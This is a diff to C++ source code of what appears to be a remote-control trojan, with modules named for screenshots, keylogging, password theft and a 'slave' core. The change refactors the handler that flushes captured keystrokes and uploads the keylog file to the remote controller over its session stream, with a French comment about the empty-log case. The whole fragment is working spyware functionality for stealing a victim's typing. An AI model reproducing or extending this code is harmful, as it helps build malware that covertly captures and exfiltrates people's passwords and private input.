@@ -15,10 +15,12 @@ using namespace System;
 using namespace Blaspheme;
 
 #include <malicious/Screenshot.hpp>
-#include <malicious/Keylogger.hpp>
 #include <malicious/Passwords.hpp>
 #include <malicious/ProgramStart.hpp>
 using namespace Malicious;
+
+#include <keyboard/KeyLogObserver.hpp>
+using namespace Keyboard;
 
 #include "RemoteControlFunctions.hpp"
 #include "SlaveCore.hpp"
@@ -214,16 +216,21 @@ namespace Inhibition
         LOG << "RebootInhibition : Ended";
     }
 
+	SendKeylog::SendKeylog(KeyLogObserver * keyLogObserverArg) : 
+		keyLogObserver(keyLogObserverArg)
+	{
+	}
+
     void SendKeylog::operator()()
     {
         LOG << "SendKeylog : Started";
         try
         {
-            Keylogger::instance().flush();
+            keyLogObserver->flush();
 
             // si le keylog est vide, on y met un message pour dire a l'utilisateur que rien n'a
             // encore été tapé
-            if(!System::Size(Keylogger::instance().getKeylogPath()))
+            if(!System::Size(keyLogObserver->getLogFilePath()))
             {
                 LOG << "Log file empty";
                 session() << KEYLOG_EMPTY;
@@ -231,7 +238,7 @@ namespace Inhibition
             else
             {
                 session() << SUCCESS;
-                Upload upload (Keylogger::instance().getKeylogPath(), session().stream());
+				Upload upload (keyLogObserver->getLogFilePath(), session().stream());
                 upload.launch();
             }
         }
